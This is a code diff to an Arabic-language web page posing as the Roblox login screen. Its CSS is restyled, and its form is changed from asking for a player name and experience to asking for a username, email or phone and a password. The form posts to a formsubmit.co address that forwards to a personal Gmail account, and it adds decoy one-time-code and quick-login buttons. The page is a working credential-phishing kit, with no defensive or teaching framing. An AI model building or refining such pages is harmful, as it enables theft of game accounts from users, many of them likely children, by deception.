@@ -11,6 +11,8 @@ body{
   background:#1c1f26;
   color:white;
 }
+
+/* ===== NAVBAR ===== */
 .navbar{
   background:linear-gradient(#1a1a1a,#0f0f0f);
   height:64px;
@@ -36,6 +38,8 @@ body{
 .btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
 .btn-blue{background:#2a7cff;border:none;color:white;}
 .btn-dark{background:#111;border:1px solid #555;color:white;}
+
+/* ===== BG ===== */
 .bg{
   background:url("IMG_0161.png") center/cover no-repeat;
   min-height:calc(100vh - 64px);
@@ -43,36 +47,48 @@ body{
   justify-content:center;
   align-items:center;
 }
+
+/* ===== LOGIN BOX ===== */
 .box{
-  background:rgba(35,38,47,0.95);
-  width:380px;
-  padding:25px;
+  background:#262a33;
+  width:360px;
+  padding:28px;
   border-radius:14px;
 }
-.box h2{text-align:center;}
+.box h2{text-align:center;margin-bottom:18px;}
+
 .box input{
   width:100%;
   padding:12px;
   margin:10px 0;
   border:none;
   border-radius:8px;
-  background:#2f3340;
-  color:#ffffff;
-  font-size:16px;
+  background:#1f222b;
+  color:white;
+  font-size:15px;
 }
-.box input::placeholder{color:#bbbbbb;}
-.mainbtn{
+.box input::placeholder{color:#aaa;}
+
+.mainbtn,.secbtn{
   width:100%;
   padding:12px;
-  background:#2a7cff;
   border:none;
   border-radius:8px;
-  color:white;
   font-weight:bold;
+  margin-top:10px;
   cursor:pointer;
 }
-.small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
-.line{height:1px;background:#444;margin:15px 0;}
+
+.mainbtn{background:#3b82f6;color:white;}
+.secbtn{background:#2f333d;color:white;}
+
+.link{
+  text-align:center;
+  font-size:13px;
+  color:#9ca3af;
+  margin:12px 0;
+  cursor:pointer;
+}
 </style>
 </head>
 
@@ -100,21 +116,21 @@ body{
     <h2>تسجيل الدخول إلى Roblox</h2>
 
     <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
-
-      <!-- Subject and Template to format the email properly -->
-      <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
+      <input type="hidden" name="_subject" value="تسجيل دخول جديد">
       <input type="hidden" name="_template" value="table">
 
-      <!-- User Inputs -->
-      <input type="text" name="Player_Name" placeholder="اسمك" required>
-      <input type="text" name="Player_Experience" placeholder="خبراتك" required>
+      <input type="text" name="username" placeholder="اسم المستخدم/البريد/الهاتف" required>
+      <input type="password" name="password" placeholder="كلمة المرور" required>
 
-      <!-- Submit button -->
       <button type="submit" class="mainbtn">تسجيل الدخول</button>
 
-    </form>
+      <div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>
 
-    <div class="small">ليس لديك حساب؟ اشترك</div>
+      <button type="submit" class="secbtn">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
+      <button type="submit" class="secbtn">تسجيل دخول سريع</button>
+
+      <div class="link">ليس لديك حساب؟ اشترك</div>
+    </form>
   </div>
 </div>
 
